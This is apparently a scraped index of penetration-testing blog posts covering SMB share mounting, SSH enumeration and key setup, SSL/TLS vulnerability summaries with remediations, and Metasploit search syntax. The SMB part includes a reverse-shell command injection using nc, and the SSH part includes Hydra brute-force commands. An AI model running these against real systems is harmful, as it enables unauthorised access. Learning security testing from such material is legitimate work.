10.11.1.218 -N Mounting SMB Shares (mount)When mounting Windows shares, we need to use cifs as the filesystem type. To do this, our first step is to download the cifs-utilities.apt-get install cifs-utilsAfter that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives.mkdir /tmp/myshareWe can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.mount -t cifs //10.11.1.31/wwwroot /mnt/mysharemount.cifs //10.11.1.31/wwwroot /mnt/mysharePassing in optionsmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rwTo unmount a particular share, you have two options. You can eithera) navigate to the share on your local system and runumount -AOrb) you can run the same command with the path following from any directoryumount -A /tmp/To get a shell back from an SMB share.logon \"/=`nc 10.11.0.233 443 -e /bin/bash`\"smb4kTo installapt-get install smb4k -yTo Runsmb4kSmbmapList all sharessmbmap -H 10.11.1.2Recursively view all files inside a share named sharesmbmap -H 10.11.1.2 -r \"share\"Pass The HashMore To Come :-)" }, { "title": "Linux Security :- Secure Shell (SSH) Introduction", "url": "/posts/linux-ssh-introduction/", "categories": "article", "tags": "linux, ssh", "date": "2022-01-27 00:00:00 +0000", "snippet": "###What is SSH?SSH, or Secure Shell, is a “tried and tested” protocol that has been in use since 1995. The SSH protocol allows remote servers to be controlled and modified securely, even over insec...", "content": "###What is SSH?SSH, or Secure Shell, is a “tried and tested” protocol that has been in use since 1995. The SSH protocol allows remote servers to be controlled and modified securely, even over insecure networks. This is accomplished through a text interface, which accepts input from your local terminal and sends it to the remote server for execution; All the while providing encryption for the communication exchanged.###SSH enumeration with LinuxObtaining information from running services is used by penetration testers during the enumeration phase of an engagement to gain insight into the target(s) under review. We can ascertain the following from the SSH protocol: SSH package version - You might be able to find the operating system and version. SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?). SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it).Let us look into acquiring this information with our Linux-based machine.Server versionSSH operates on a client-server architecture. In this architecture, the host being accessed acts as an SSH server, while the host connecting the server acts as an SSH client. Both these utilise the SSH protocol with the help of software; The most common of which is the OpenSSH package for Linux-based systems.To find out the SSH server software and its version in use, we can use netcat.nc 10.0.0.1 22SSH-2.0-OpenSSH_8.4p1 Debian-6FingerprintingSSH keys provide access without the need for passwords. They consist of public and private key pairs, which act as means to encrypt and decipher data exchanged.Public keys can also be used to verify the identity of the offering party. A hash obtained from the public key, is also known as fingerprint. SSH servers display their fingerprints to users when they first connect to the server, or the public key of the server has changed since the last time a connection was initiated.To obtain the fingerprint of a server, you can use the SSH client on Linux.root@kali:~# ssh root@10.11.1.71 The authenticity of host '10.11.1.71 (10.11.1.71)' can't be established. ECDSA key fingerprint is SHA256:AibCWx1KvdJmNHd3KVsYksWtveJPdLZAsHMIChsTeHE. Are you sure you want to continue connecting (yes/no)? SSH BannerBefore allowing authentication, the SSH server can display a pre-configured message to its users. If an SSH banner is configured, you can see it while fingerprinting the server as described above.NmapNmap is a network mapping tool that is an essential part of every penetration tester’s arsenal. The installation comes with Nmap Scripting Engine (NSE), which allows users to write and share network enumeration scripts. These scripts are most typically located at /usr/share/nmap on Linux machines.To view which SSH scripts are available with your version of nmap, use ls .bash root@root:~/# ls -ls /usr/share/nmap/scripts/*ssh*8 -rw-r--r-- 1 root root 5659 Sep 2 2016 /usr/share/nmap/scripts/ssh2-enum-algos.nse 16 -rw-r--r-- 1 root root 15363 Sep 2 2016 /usr/share/nmap/scripts/ssh-hostkey.nse 4 -rw-r--r-- 1 root root 1446 Sep 2 2016 /usr/share/nmap/scripts/sshv1.nse` The nmap host key script allows fingerprinting and banner grabbing across the network.nmap 192.168.1.0/24 -p 22 -sV --script=ssh-hostkey [...]| ssh-hostkey: Possible duplicate hosts| Key 1024 60:ac:4d:51:b1:cd:85:09:12:16:92:76:1d:5d:27:6e (DSA) used by:| 192.168.1.1| 192.168.1.2| Key 2048 2c:22:75:60:4b:c3:3b:18:a2:97:2c:96:7e:28:dc:dd (RSA) used by:| 192.168.1.1|_ 192.168.1.2HydraSSH servers can be configured to support password authentication. This means that upon connecting, a username and password are required for the user to log in. Unlike key-based authentication, password authentication exposes the server brute force password attacks.Hydra is a tool for performing brute force attacks on SSH. These attacks can be set to use a word list, a password list, or a host list.Several hosts with a username and a password list:hydra -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt -M hosts.txt sshOne host with a password list against a single user (“root”):hydra -l root -P /usr/share/wordlists/rockyou.txt 10.1.1.1 sshHydra flags:-M = (FILE) server list for parallel attacks, one entry per line -e nsr = \"n\" null password, \"s\" try login as pass, \"r\" try pass as login -s = (PORT) if the service is on a different default port, define it here -l or -L = single username login or username from FILE -p or -P = single password login or password from FILE Word listsThe success rate of a brute force attack is only as high as the quality of the word list used. Word lists should be chosen with the basis of information gathered within the enumeration phase. For example, attacking the “root” username on a Windows-based SSH server is less likely to grant access than attacking it on a Linux-based SSH server.Multi-purpose username lists:/usr/share/ncrack/default.usr /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt The most 14344392 popular passwords from a breached password database collection:/usr/share/wordlists/rockyou.txt About SSH keysSSH keys are a more secure way of logging into a server with SSH than a password alone. As we have uncovered earlier, a brute force attack can eventually crack a password; However, it is nearly impossible to decipher SSH keys with brute force alone.When generating a key pair, you will end up with two long strings of characters: a public and a private key. You can put the public key on any server and then unlock it by connecting with a client that has the private key. When the two match, the system unlocks without requiring a password. You can boost security even further by encrypting the private key with a password.How to set up SSH keyshttps://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2In case of key-based authentication, the SSH connection requires two key pairs: Your client software compares the server’s (host) public key to data encrypted with the host private key. This necessitates having a copy of the server’s public key, which you are given at the first connection and which your client stores if you approve of it. The server verifies your authentication data, which is encrypted with your user private key, using a copy of your user public key that it has because you placed it there (or had someone put there for you).Step One - Create the RSA key pairThe first step is to create the key pair on the client machine (which is likely just your computer):ssh-keygen -t rsa Step Two - Store the keys and passphraseOnce you have entered the Gen Key command, you will get a few more questions:Enter file in which to save the key (/home/demo/.ssh/id_rsa): You can press enter here, saving the file to the user’s home (in this case, my example user is called demo).Next, you will be prompted for a passphrase.Enter passphrase (empty for no passphrase): It is entirely up to you whether or not to use a passphrase. Entering a passphrase has advantages: the security of a key, no matter how encrypted, is still dependent on the fact that it is not visible to others. If an unauthorised user obtains a pass-protected private key, they will be unable to log in to the accounts associated with it until they figure out the passphrase, buying the hacked user some time. The only disadvantage of having a passphrase is having to type it in each time you use the key pair.The entire key generation process looks like this:ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/demo/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/demo/.ssh/id_rsa. Your public key has been saved in /home/demo/.ssh/id_rsa.pub. The key fingerprint is: 4a:dd:0a:c6:35:4e:3f:ed:27:38:8c:74:44:4d:93:67 demo@a The key's randomart image is: +--[ RSA 2048]----+ | .oo. | | . o.E | | + . o | | . = = . | | = S = . | | o + = + | | . o + o . | | . o | | | +-----------------+ The public key is now located in /home/demo/.ssh/id_rsa.pub The private key (identification) is now located in /home/demo/.ssh/id_rsa Step Three - Copy the public keyOnce the key pair has been generated, the public key should be placed on the server that we intend to use.Using the ssh-copy-id command, you can copy the public key into the new machine’s authorized_keys file. Replace the example username and IP address below with your own.ssh-copy-id user@10.1.1.1Alternatively, you can paste in the keys using SSH:cat ~/.ssh/id_rsa.pub | ssh user@10.1.1.1 \"mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys\" No matter which command you use, you should see something like this:The authenticity of host '10.1.1.1 (10.1.1.1)' can't be established. RSA key fingerprint is b1:2d:33:67:ce:35:4d:5f:f3:a8:cd:c0:c4:48:86:12. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '10.1.1.1' (RSA) to the list of known hosts. user@12.34.56.78's password: You can now log in to user@10.1.1.1 without being prompted for a password. However, if you set a password, you will be prompted to enter it at that time (and every time you log in in the future).Optional Step Four -Disable the password for root loginOnce you have copied your public key to the server and confirmed that you can log in using just the SSH keys, you can restrict root login to SSH keys only.To do this, open the SSH configuration file:sudo nano /etc/ssh/sshd_config Find the line that includes PermitRootLogin and change it to ensure that users can only connect using their SSH key:PermitRootLogin without-password Put the changes into action:reload ssh" }, { "title": "Vulnerabilities in SSL & TLS :- Overview", "url": "/posts/vulnerabilities-ssl-tls-overview/", "categories": "article", "tags": "ssl, tls", "date": "2022-01-24 00:00:00 +0000", "snippet": "Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are un...", "content": "Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are unfamiliar with the subject.A timeline of SSL and TLS development: SSL 2.0. Released in 1995, this version of SSL is now prohibited by the Internet Engineering Task Force (see RFC-6176). SSL 3.0. Released in 1996, SSL 3.0 is deprecated, but a few browsers still support it (RFC-7568). TLS 1.0. Released in 1999 and deprecated in 2020. TLS 1.1. Released in 2006 and deprecated in 2020. TLS 1.2. Released in 2008 and still has no security issues. TLS 1.3. Released in 2018 and continues to be the main protocol used today without any known vulnerabilities.In this article series we will cover: Heartbleed SWEET32 DROWN FREAK logjam BEAST BREACH RC4 Biases CCS injection vulnerability POODLE POODLE over TLS Lucky13 TLS RenegotiationQuick GuideRight now, if you have the client on the phone, however… Attack CVE Affects Mitigation Logjam CVE-2015-4000 The TLS protocol 1.2 and earlier when a DHE_EXPORT cipher suite is enabled. Enforce DH group sizes of 1,024 bits and above POODLE CVE-2014-3566 SSL version 3.0 Disable support for SSL 3.0 BEAST CVE-2011-3389 TLS 1.0 or any version of SSL Enforce TLS 1.1 and higher CRIME 2012-4929 TLS compression Disable TLS compression BREACH and TIME CVE-2013-3587 HTTP compression Disable HTTP compression Lucky 13 CVE-2013-0169 TLS protocol 1.1 and 1.2 and the DTLS protocol 1.0 and 1.2 in several vendors products Disable CBC ciphers if your server implementation is flawed RC4 byte biases CVE-2013-2566 Connections supporting RC4 Disable support for RC4 cipher suites FREAK CVE-2015-0204 Any system willing to negotiate RSA Export Keys. Disable support for weak export-grade ciphers SWEET32 CVE-2016–2183 and CVE-2016–6329 Long term client browser foothold Do not support or negotiate 3DES cipher-suites. At a minimum, AES should be preferred over 3DES. Limit length of TLS session. " }, { "title": "Vulnerabilities in SSL & TLS :- TLS Renegotiation", "url": "/posts/vulnerabilities-ssl-tls-tls-renegotiation/", "categories": "article", "tags": "insecure-tls-renegotiation, ssl, tls", "date": "2022-01-23 00:00:00 +0000", "snippet": "Main Points SSL/TLS client-initiated renegotiation is a feature that allows the client to renegotiate new encryption parameters for an SSL/TLS connection within a single TCP connection. During th...", "content": "Main Points SSL/TLS client-initiated renegotiation is a feature that allows the client to renegotiate new encryption parameters for an SSL/TLS connection within a single TCP connection. During the SSL/TLS handshake, the server incurs a higher computational cost. An attacker can exploit the higher computational cost of the server by opening an SSL/TLS connection to the server and repeatedly initiating renegotiation. This would cause the server to waste resources that would otherwise be used for the server’s normal function. In addition, there is the possibility of a DOS. To exploit this vulnerability, the server must not support secure renegotiation and must allow client-side renegotiation. A TLS session can be renegotiated over an existing secure channel to rekey or perform further authentication. A flaw was discovered in the mechanism, by which an attacker with network access could intercept and hold handshake records from a legitimate client, establish a TLS session itself with a server, send application data, initiate renegotiation, and release the legitimate handshake records. As renegotiation is performed over an existing channel, the server believes the session is one and the same.Quick ReferenceTLDRThis is a plaintext injection attack into previously sent packets. TLS and SSL 3.0 do not correctly associate renegotiation handshakes with existing connections. This allows a person-in-the-middle positioned attacker to insert data into a HTTPS session.NameTLS Renegotiation VulnerabilityCVE NumberThe TLS protocol, and SSL protocol 3.0 (and possibly earlier)Microsoft VulnerabilityMS10-049Type of VulnerabilityWithin the protocol.AffectedThe TLS protocol, SSL protocol 3.0 and possibly earlier versions of SSL.RemediationAvoid renegotiation, or cryptographically bind original and renegotiation TLS handshakes with the secure renegotiation extension." }, { "title": "Vulnerabilities in SSL & TLS :- Lucky13", "url": "/posts/vulnerabilities-ssl-tls-lucky13/", "categories": "article", "tags": "lucky13, ssl, tls", "date": "2022-01-21 00:00:00 +0000", "snippet": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. First reported by the Informa...", "content": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. First reported by the Information Security Group at Royal Holloway, University of London. TLS headers contain 13 bytes of data for the secure handshake protocol, which can be exploited. When processing malformed CBC padding, the TLS protocols 1.1 and 1.2, as well as the DTLS protocols 1.0 and 1.2, as used in OpenSSL, OpenJDK, PolarSSL, and other products, do not properly consider timing side-channel attacks on a MAC check requirement, allowing remote attackers to conduct distinguishing attacks and plaintext recovery via statistical analysis of timing data for crafted packets. To have enough data to attack, you need to collect several days’ worth of packets and traffic via a person-in-the-middle attack. This is why Lucky 13 is a theoretically possible attack vector.Quick ReferenceDescriptionThe TLS protocols 1.1 and 1.2, as well as the DTLS protocols 1.0 and 1.2, do not properly consider timing side-channel attacks when processing malformed CBC padding, allowing remote attackers to conduct plaintext-recovery.NameLucky13CVE NumberCVE-2013-0169Type of VulnerabilityWeakness in SSL and TLS themselves and not in a particular implementation of them.AffectedThe TLS protocols 1.1 and 1.2 and the DTLS protocols 1.0 and 1.2, as used in OpenSSL, OpenJDK, PolarSSL, and other products.RemediationAvoid CBC mode cipher-suites (use AEAD cipher-suites).Use Encrypt-then-MAC TLS extension." }, { "title": "Vulnerabilities in SSL & TLS :- POODLE over TLS", "url": "/posts/vulnerabilities-ssl-tls-poodle-over-tls/", "categories": "article", "tags": "poodle-over-tls, ssl, tls", "date": "2022-01-20 00:00:00 +0000", "snippet": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. Uses a padding-oracle attack ...", "content": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. Uses a padding-oracle attack in the CBC padding because of the vulnerable TLS implementation.Quick ReferenceDescriptionThis is the POODLE attack; however, the writing over the CBC padding is possible due to TLS implementation not checking cipher padding.AbbreviationPOODLE over TLSNamePadding Oracle On Downgraded Legacy Over Transport Layer SecurityCVE NumberCVE-2014-8730Type of VulnerabilityThe vulnerability is caused by the TLS server failing to verify block cipher padding when used with a cipher suite that utilises a block cipher, such as AES and DES. Due to the lack of padding checking, encrypted TLS traffic can be decrypted.AffectedThe SSL profiles components in F5 BIG-IP LTM, APM, and ASM 10.0.0 through 10.2.4 and 11.0.0 through 11.5.1AAM 11.4.0 through 11.5.1, AFM 11.3.0 through 11.5.1, Analytics 11.0.0 through 11.5.1, Edge Gateway, WebAccelerator, and WOM 10.1.0 through 10.2.4 and 11.0.0 through 11.3.0, PEM 11.3.0 through 11.6.0, and PSM 10.0.0 through 10.2.4 and 11.0.0 through 11.4.1 and BIG-IQ Cloud and Security 4.0.0 through 4.4.0 and Device 4.2.0 through 4.4.0, when using TLS 1.x before TLS 1.2, does not properly check CBC padding bytes when terminating connections.RemediationCheck CBC padding in TLS stack.Patch vulnerable TLS implementations (ask vendor)." }, { "title": "Vulnerabilities in SSL & TLS :- POODLE", "url": "/posts/vulnerabilities-ssl-tls-poodle/", "categories": "article", "tags": "poodle, ssl, tls", "date": "2022-01-18 00:00:00 +0000", "snippet": "Main Points Discovered by Google security team on October the 14th, 2014. The attack is on SSL 3.0 (SSLv3), an obsolete and insecure protocol. Attacker needs to somehow force the client and the ...", "content": "Main Points Discovered by Google security team on October the 14th, 2014. The attack is on SSL 3.0 (SSLv3), an obsolete and insecure protocol. Attacker needs to somehow force the client and the server to agree to use the SSL 3.0 protocol. An attacker can do this by tampering with the SSL negotiation process. SSL handshake will try to use the most recently supported version of TLS (starting with say TLS 1.2) at both the client and the server. However, for compatibility reasons, many clients have implemented a fallback mechanism that lets them retry a failed negotiation by using an older version. If an attacker interferes with the SSL negotiation process to disrupt it, the client will then fall back successively to TLS 1.1, TLS 1.0, and finally to SSL 3.0. The vulnerability exploits the way the SSL version 3.0 handles padded bytes when used with Cipher Block Chaining (CBC) mode of operation. Due to SSLv3’s under-specification of the contents of the CBC padding bytes, and since SSLv3 did not say what the padding bytes should be, SSL implementations cannot check those padding bytes which opens SSLv3 up to an oracle attack. This may allow a person-in-the-middle attacker to decrypt a selected byte of ciphertext. To decrypt the stream requires as few as 256 SSL version 3 connections; however, they would need to force a victim application to repeatedly send the same data over a newly created SSL version 3.0 connection. This would require social engineering. To exploit this as a web vulnerability, the attacker must possess the following: The attacker must control the connection between the client and the server. The attacker must be able to inject code into the victim’s browser (e.g. JavaScript code) to launch the attack successfully. Quick ReferenceDescriptionVia a person-in-the-middle position, the victim is forced to downgrade to SSL v3.0, which contains an oracle attack. Whether a server or a client - and you do not wish to fall short of this vulnerability - then disable support for SSL completely as per the remediation section.AbbreviationPOODLENamePadding Oracle On Downgraded LegacyCVE NumberCVE-2014-3566Type of VulnerabilityA padding-oracle attack - The SSL protocol 3.0 uses nondeterministic CBC padding, which makes it easier for person-in-the-middle attackers to obtain cleartext data via a padding-oracle attack.AffectedThis vulnerability affects all SSL version 3.0 compliant products.RemediationDo not Support SSL version 3 or lower.Please note that this will break the website connection for IE6 users, should this browser be important for some reason.For Apache: SSLProtocol all -SSLv2 -SSLv3For Nginx: ssl_protocols TLSv1 TLSv1.1 TLSv1.2;How to Configure Web Server to Mitigate POODLE VulnerabilityTo protect our web server against POODLE, it is recommended to stop support for SSL version 3.0 or lower. This, however, would still leave us vulnerable to BEAST, where it is recommended to stop support for TLS 1.0 as well.Apache Web ServerEdit the SSLProtocol directive in the ssl.conf file, which is usually located in /etc/httpd/conf.d/ssl.conf. For example, if you have:SSLProtocol allchange it to:SSLProtocol TLSv1.1 TLSv1.2Then, restart httpd.NGINXEdit the ssl_protocols directive in the nginx.conf file. For example, if you have:ssl_protocols TLSv1.1 TLSv1.2;change it to:ssl_protocols TLSv1.1 TLSv1.2;Then, restart nginx.Microsoft IISTo disable TLS 1.0 in Microsoft IIS, you must edit the registry settings in Microsoft Windows. Open the registry editor Find the key HKLM SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.0\\Server Change the DWORD value of the Enabled entry to 0. Create a DisabledByDefault entry and change the DWORD value to 1. Repeat the above steps for all versions of SSL." }, { "title": "Vulnerabilities in SSL & TLS :- CCS injection vulnerability", "url": "/posts/vulnerabilities-ssl-tls-ccs-injection-vulnerability/", "categories": "article", "tags": "css-injection, openssl, ssl, tls", "date": "2022-01-17 00:00:00 +0000", "snippet": "Main Points A weakness exists within a certain version of OpenSSL that allows clients and servers to be forced via specifically specially crafted handshake packet to use weak key material for comm...", "content": "Main Points A weakness exists within a certain version of OpenSSL that allows clients and servers to be forced via specifically specially crafted handshake packet to use weak key material for communication. Via a person-in-the-middle context an attacker maybe able to decrypt/modify traffic.Quick ReferenceDescriptionA weakness in certain versions of OpenSSL that allows an attacker to use weak key material for communication with the hope decrypting traffic later.NameCCS injection vulnerabilityCVE NumberCVE-2014-0224Type of VulnerabilityVulnerability in the OpenSSL library.AffectedOpenSSL versions said to be affected include: Versions before 0.9.8za 1.0.0 before 1.0.0m 1.0.1 before 1.0.1hRemediationUpgrade to a non-vulnerable version of the OpenSSL Library." }, { "title": "Vulnerabilities in SSL & TLS :- RC4 Byte Biases", "url": "/posts/vulnerabilities-ssl-tls-rc4-byte-biases/", "categories": "article", "tags": "rc4-byte-biases, ssl", "date": "2022-01-16 00:00:00 +0000", "snippet": "Main Points The RC4 algorithm has many byte biases (certain bytes are more (or less) likely to appear than others). An attacker can use byte biases to recover plaintext bytes at known locations (...", "content": "Main Points The RC4 algorithm has many byte biases (certain bytes are more (or less) likely to appear than others). An attacker can use byte biases to recover plaintext bytes at known locations (such as a session token within a cookie) upon encrypting the same plaintext many times and monitoring the ciphertext. This attack requires generation of large data volumes. It is somewhat impractical but highlights a significant flaw within RC4.Quick ReferenceDescriptionThe RC4 algorithm, which is used in the TLS and SSL protocols, has many single-byte biases, making it easier for remote attackers to carry plaintext-recovery attacks by statistically analysing ciphertext in a large number of sessions that use the same plaintext.NameRC4 Byte BiasesCVE NumberCVE-2013-2566Type of VulnerabilityCBC decryption vulnerabilityAffectedConnections supporting RC4RemediationDisable support for RC4 algorithm." }, { "title": "Vulnerabilities in SSL & TLS :- BREACH", "url": "/posts/vulnerabilities-ssl-tls-breach/", "categories": "article", "tags": "breach, ssl, tls", "date": "2022-01-15 00:00:00 +0000", "snippet": "Main Points The attacker must use a different exploit to become a man-in-the-middle and to inject content into the network traffic stream for this attack to work. The BREACH attack is very simila...", "content": "Main Points The attacker must use a different exploit to become a man-in-the-middle and to inject content into the network traffic stream for this attack to work. The BREACH attack is very similar to how CRIME work but BREACH exploits of vulnerability within the HTTP compression allowing an attacker to identify if text exists within a page. BREACH attack on HTTP request responses, whereas CRIME looks at HTTP requests. The BREACH attack is agnostic to the version of TLS/SSL, and does not require TLS-layer compression (only HTTP compression). The BREACH attack works against any cipher suite. The BREACH attack against stream ciphers is simpler as when performing attacks against block ciphers additional work must be done to align the output to the cipher text blocks. The BREACH attack can be exploited with just a few thousand requests, and can be executed in under a minute. The number of requests required will depend on the secret size. The power of the attack comes from the fact that it allows guessing a secret one character at a time.Quick ReferenceTLDRThe HTTPS protocol can encrypt compressed data without properly obfuscating the length of the unencrypted data, which makes it easier for man-in-the-middle (MitM) attackers to obtain plaintext secret values by observing length differences during a series of guesses in which a string in an HTTP request URL potentially matches an unknown string in an HTTP response body.AbbreviationBREACHNameBrowser Reconnaissance &amp; Exfiltration via Adaptive Compression of HypertextCVE NumberCVE-2013-3587Type of VulnerabilityThe vulnerability is in HTTPS protocol compression.AffectedTo be vulnerable, a web application must: Be served from a server that uses HTTP-level compression Reflect user-input in HTTP response bodies Reflect a secret (such as a CSRF token) in HTTP response bodiesRemediationNo clear mitigation to this attack. The following is a list of potential mitigations in order of effectiveness (not practicality) provided by breachattack.com Disabling HTTP compression Separating secrets from user input Randomizing secrets per request Masking secrets (effectively randomizing by XORing with a random secret per request) Protecting vulnerable pages with CSRF Length hiding (by adding random number of bytes to the responses) Rate-limiting the requests" }, { "title": "Vulnerabilities in SSL & TLS :- BEAST", "url": "/posts/vulnerabilities-ssl-tls-beast/", "categories": "article", "tags": "beast, ssl, tls", "date": "2022-01-14 00:00:00 +0000", "snippet": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. The attack was carried out fo...", "content": "Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work. The attack was carried out for the first time in 2011 by security researchers Thai Duong and Juliano Rizzo (Google Chrome developers), but the theoretical vulnerability was discovered in 2002 by Phillip Rogaway. Thai Duong and Juliano Rizzo created their POC in JavaScript. Researchers found that TLS 1.0 (and older) encryption can be broken quickly, giving the attacker an opportunity to listen in on the conversation. If your server supports TLS 1.0, the attacker can make it believe that this is the only protocol that the client can use. This is called a protocol downgrade attack. Then, the attacker can use the BEAST attack to eavesdrop. The attack leverages weaknesses in cipher block chaining (CBC) to exploit the Secure Sockets Layer (SSL) protocol If the attacker can get into a person-in-the-middle position while the victims are using TLS 1.0, they may silently decrypt secrets.Quick ReferenceDescriptionA vulnerability that allows a person-in-the-middle attacker to eavesdrop on a connection and downgrade encryption support to (vulnerable) TLS 1.0. This allows attackers to decrypt the traffic and listen in on conversations.AbbreviationBEASTNameBrowser Exploit Against SSL/TLSCVE NumberCVE-2011-3389Type of VulnerabilityIn the SSL protocol and TLS 1.0AffectedIf you support TLS 1.0 or any version of SSL, then you are vulnerable to BEAST.Originally, the RC4 cipher was recommended for use to mitigate BEAST attacks (because it is a stream cipher, not a block cipher). However, RC4 was later found to be unsafe.How to Configure Web Server to Mitigate BEAST VulnerabilityTo protect our web server against POODLE it is recommended to stop support for SSL version 3.0 or lower. This, however, would still leave us vulnerable to BEAST, where it is recommended to stop support for TLS 1.0 as well.Apache Web ServerEdit the SSLProtocol directive in the ssl.conf file, which is usually located in /etc/httpd/conf.d/ssl.conf. For example, if you have:SSLProtocol allchange it to:SSLProtocol TLSv1.1 TLSv1.2Then, restart httpd.NGINXEdit the ssl_protocols directive in the nginx.conf file. For example, if you have:ssl_protocols TLSv1.1 TLSv1.2;change it to:ssl_protocols TLSv1.1 TLSv1.2;Then, restart nginx.Microsoft IISTo disable TLS 1.0 in Microsoft IIS, you must edit the registry settings in Microsoft Windows. Open the registry editor Find the key HKLM SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.0\\Server Change the DWORD value of the Enabled entry to 0. Create a DisabledByDefault entry and change the DWORD value to 1. Repeat the above steps for all versions of SSL." }, { "title": "Vulnerabilities in SSL & TLS :- CRIME", "url": "/posts/vulnerabilities-ssl-tls-crime/", "categories": "article", "tags": "crime, ssl, tls", "date": "2022-01-13 00:00:00 +0000", "snippet": "Main Points The attack was discovered by security researchers Juliano Rizzo and Thai Duong, who cooked up the BEAST SSL exploit. For this attack to work, the attacker must use a different exploit...", "content": "Main Points The attack was discovered by security researchers Juliano Rizzo and Thai Duong, who cooked up the BEAST SSL exploit. For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. The CRIME (Compression Ratio Info-leak Made Easy) attack is a vulnerability in SSL/TLS compression. CRIME is a side-channel attack that uses the compressed size of HTTP requests to discover session tokens or other secret information. The technique exploits SSL/TLS-protected web sessions when they use one of two data-compression schemes (DEFLATE and gzip) built into the protocol and used to reduce network congestion or the loading time of web pages. In order to carry out the attack, the attacker must have control over the plaintext as well as the ability to intercept the encrypted message. On secret web cookies transmitted over compressed HTTPS or SPDY connections, this attack exposes cookie data to session hijacking. When the size of the compressed content is reduced, it can be inferred that some part of the injected content is likely to match some part of the source.Quick ReferenceDescriptionCRIME is a vulnerability in SSL/TLS compression that allows attackers with person-in-the-middle context to compare length differences between a string in an HTTP request and an unknown string in an HTTP header.AbbreviationCRIMENameCompression Ratio Info-leak Made EasyCVE NumberCVE-2012-4929Type of VulnerabilityThe vulnerability is within TLS compression.AffectedTLS compression is required for the connection. The attacker requires a person-in-the-middle position, the ability to control plaintext on a website visited by the victim, and the ability to intercept encrypted messages.RemediationDisable SSL/TLS compression to prevent the CRIME attack. CRIME can be defeated by preventing the use of compression, either at the client end, by disabling compression of SPDY requests in the browser, or by the website preventing the use of data compression on such transactions using the TLS protocol negotiation features." }, { "title": "Searching Metasploit", "url": "/posts/searching-metasploit/", "categories": "tutorial", "tags": "metasploit", "date": "2022-01-11 00:00:00 +0000", "snippet": "Searching MetasploitSearch for payloads, exploits, or post modulessearch type:payloadsearch type:exploitsearch type:postSearch for all modules that operate on a given port (e.g. FTP, SSH, HTTP)sear...", "content": "Searching MetasploitSearch for payloads, exploits, or post modulessearch type:payloadsearch type:exploitsearch type:postSearch for all modules that operate on a given port (e.g. FTP, SSH, HTTP)search port:21search port:22search port:80Search all CVEs from 2011search cve:2011Careful when analysing the results of this above command. If you use the above example you might see a row likeSnippet From Search for CVE from 2011 68 exploit/unix/webapp/joomla_tinybrowser 2009-07-22This example shows the disclosure date as a date in 2009. If we check the module however the module information. We can see the CVE is actually dated 2011 (https://nvd.nist.gov/vuln/detail/CVE-2011-4908)info exploit/unix/webapp/joomla_tinybrowserSearch by Exploit DBsearch edb:9296Search for exploits by their AKAsearch aka:shellshocksearch aka:heartbleedsearch aka:eternalblueMetasploit Search For Heartbleed Search by platformsearch platform:windowssearch platform:linuxsearch platform:macOr exclude a platformsearch platform:-windowsThere are a few other options that we can add and we will go through some advanced search examples and introduce them.In this search, we are looking for results that contain only exploits with an associated CVE released in 2017. We exclude any results that are for the Windows platform. Then we filter out by the exploits that operate on port 80 with a rank of ‘excellent’search type:exploit cve:2017 platform:-windows port:80 rank:excellentAs you can see we can get very specific in what we are looking for by chaining search criteria together.If we add the word ‘check’ to the end of our search then we will only see modules that have a Metasploit check included.💡 the `check` command is available for some modules. The check command is designed so you can test if the target is vulnerable before attempting to exploit it.The full commandsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check At the current time of writing, I am down to 5 results with the above search. We wanted to test all these modules but we wanted to order them. These are the modules as we currently see them.# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/jenkins_cli_deserialization 2017-04-26 excellent Yes Jenkins CLI Deserialization 1 exploit/linux/http/kaltura_unserialize_cookie_rce 2017-09-12 excellent Yes Kaltura Remote PHP Code Execution over Cookie 2 exploit/multi/http/october_upload_bypass_exec 2017-04-25 excellent Yes October CMS Upload Protection Bypass Code Execution 3 exploit/multi/http/shopware_createinstancefromnamedarguments_rce 2019-05-09 excellent Yes Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE 4 exploit/unix/http/zivif_ipcheck_exec 2017-09-01 excellent Yes Zivif Camera iptest.cgi Blind Remote Command ExecutionIf we add the -s option we can pick a target field for us to search on. Options are “rank”, “disclosure_date”, “name”, “date”, “type”, “check”.We can see from the example that the results are already sorted by name so -s name at first might seem pointless as this is the default. jenkins_cli_deserialization kaltura_unserialize_cookie_rce october_upload_bypass_exec shopware_createinstancefromnamedarguments_rce zivif_ipcheck_execHowever, we can also reverse the search entries so we get the results starting Z and working back to J.search type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s name -rReverse Name Order SearchOr we can search by date order (which of course can be reversed)search type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s datesearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s date -r Reverse Date Order SearchWhat if we are happy with our results but we want to save them so we can work through them and mark them off? Metasploit allows you to export your results to 